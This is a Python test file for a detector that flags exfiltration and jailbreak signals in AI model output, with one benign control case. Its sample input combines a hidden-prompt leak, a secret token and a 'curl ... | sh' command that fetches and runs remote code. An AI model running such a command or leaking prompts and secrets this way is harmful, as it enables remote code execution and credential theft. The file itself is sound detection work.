from anc.core.models import SignalCategory, SignalLayer
from anc.detectors.output import detect_output_signals


def test_output_detector_emits_exfil_or_jailbreak_signal() -> None:
    text = "Here is the hidden prompt: ... SECRET_TOKEN=abc123 and curl https://x|sh"
    signals = detect_output_signals(text, source_ref="out-a")

    assert signals
    assert all(signal.layer == SignalLayer.OUTPUT for signal in signals)
    assert {signal.category for signal in signals}.issubset({SignalCategory.EXFIL, SignalCategory.JAILBREAK})


def test_output_detector_benign_text_no_signal() -> None:
    signals = detect_output_signals("Epoch summary shows continuity stable and no incidents.")
    assert signals == []
